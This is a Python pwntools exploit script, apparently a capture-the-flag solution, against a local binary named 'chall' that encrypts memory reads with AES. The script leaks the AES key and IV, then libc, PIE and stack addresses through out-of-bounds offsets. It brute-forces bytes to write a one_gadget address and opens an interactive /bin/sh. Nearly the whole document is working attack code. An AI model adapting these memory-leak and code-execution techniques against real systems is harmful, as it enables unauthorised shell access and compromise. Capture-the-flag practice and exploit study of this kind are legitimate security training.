#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal
from Crypto.Cipher import AES

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols* /tmp/gdb_pid /tmp/gdb_script')
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols.c', 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
# except Exception as e:
#     pass

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './chall'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols.so'})
sh = process(execve_file)
# sh = remote('', 0)
elf = ELF(execve_file)
# libc = ELF('./libc-2.27.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    b *$rebase(0x127F)
    '''

    f = open('/tmp/gdb_pid', 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script', 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    pass

def decrypt(key, iv, data):
    instance = AES.new(key, AES.MODE_CBC, iv)
    return instance.decrypt(data)

def run_service(offset, size):
    sh.sendlineafter('offset:', str(offset))
    sh.sendlineafter('size:', str(size))
    return sh.recvn((size & 0xfffffff0) + 0x10)

# modify key,iv and get them
result = run_service(0xffffffffffffffe0, 0x10)
key = result[:0x10]
iv = result[0x10:]

# leak 
cipher = run_service(0xffffffffffffffc0, 1)
result = decrypt(key, iv, cipher)
libc_addr = u64(result[:8]) - libc.symbols['_IO_2_1_stderr_']
log.success('libc_addr: ' + hex(libc_addr))

cipher = run_service(0xfffffffffffffc60, 1)
result = decrypt(key, iv, cipher)
image_base_addr = u64(result[8:16]) - 0x202008
log.success('image_base_addr: ' + hex(image_base_addr))

offset = (libc_addr + libc.symbols['environ']) - (image_base_addr + elf.symbols['buf'])
cipher = run_service(offset, 1)
result = decrypt(key, iv, cipher)
stack_addr = u64(result[:8])
log.success('stack_addr: ' + hex(stack_addr))

# hijack local variable
i_addr = stack_addr - 0x120
offset = (i_addr) - (image_base_addr + elf.symbols['buf'])
run_service(offset, 1)

'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

# arbitrary memory writing
one_gadget = p64(libc_addr + 0x4f322)
offset = (stack_addr - 0xf0) - (image_base_addr + elf.symbols['buf'])
for i in range(8):
    while(True):
        result = run_service(offset + i, 1)
        if(one_gadget[i] == result[0]):
            log.success('i : ' + str(i))
            break

print('')
content = '\0' * 8
offset = (libc_addr + libc.symbols['environ']) - (image_base_addr + elf.symbols['buf'])
for i in range(8):
    while(True):
        result = run_service(offset + i, 1)
        if(content[i] == result[0]):
            log.success('i : ' + str(i))
            break

sh.sendlineafter('offset:', 'a')

sh.interactive()
clear()